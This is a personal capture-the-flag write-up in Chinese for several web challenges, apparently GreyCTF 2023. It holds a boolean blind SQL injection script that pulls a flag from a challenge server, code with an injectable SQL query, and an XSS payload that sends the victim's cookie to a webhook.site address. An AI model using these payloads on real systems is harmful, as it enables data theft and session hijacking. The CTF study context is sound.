
# web
### FETUS WEB
签到,直接搜索flag有两段,一拼接就可以
### 100 QUESTIOM
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230520230422.png)

```python
    db = sqlite3.connect("database.db")
    cursor = db.execute(f"SELECT Question FROM QNA WHERE ID = {qn_id}")
    qn = cursor.fetchone()[0]

    # check answer
    cursor = db.execute(f"SELECT * FROM QNA WHERE ID = {qn_id} AND Answer = '{ans}'")
    result = cursor.fetchall()
    correct = True if result != [] else False

```
由于是sqlite3,使用[网站](https://inloop.github.io/sqlite-viewer/)读取database.db文件
存在明显的布尔盲注
```python
import requests
import string


#flag=['{', '1', '_', 'c', '4', 'N', '7', '_', '5', '3', '3', '}', '#']
print(''.join(flag))
url="http://34.126.139.50:10513/?qn_id=100&ans=grsda' or substr((select Answer from qna where id=42),{0},1)='{1}'-- "
flag=[]
for i in range(5,18):
    for j in string.printable:
        result=requests.get(url.format(i,j))
        print(url.format(i,j))
        if "Correct" in result.text:
            flag.append(j)
            print(flag)
            break
```

### BaBy WEB
```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == "GET":
        return render_template('index.html')
    
    message = request.form.get('message')
    if len(message) == 0:
        flash("Please enter a message") 
        return render_template('index.html')

    link = f"/ticket?message={quote(message)}"

    # Admin vists the link here
    visit(BASE_URL, f"{BASE_URL}{link}")

    return redirect(link)
```


感觉我的xss没问题啊
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230520233853.png)

p

---
```js
<script>document.location='https://webhook.site/(some_id)?cookie='+document.cookie;</script>
```
### Login Bot


![[greyctf 2023 2023-05-21 01.27.42.excalidraw]]
不会啊

---

1. send_post将webhook的url传进url列表,返回一个url序号
```python
resp = s.post(f'{BASE_URL}/send_post', data={    
	'title': 'test',
	'content': WEBHOOK_URL
})
```
2. send_post来访问这个置信url
```python
resp = s.post(f'{BASE_URL}/send_post', data={    
	'url': f'/url/{url_id}',
	'title': 'test',
	'content': WEBHOOK_URL
})
```

还是代码逻辑没看懂啊
# reverse

# pwn

# crypto

# Misc


---
## *相关wp*




2023-05-20   22:34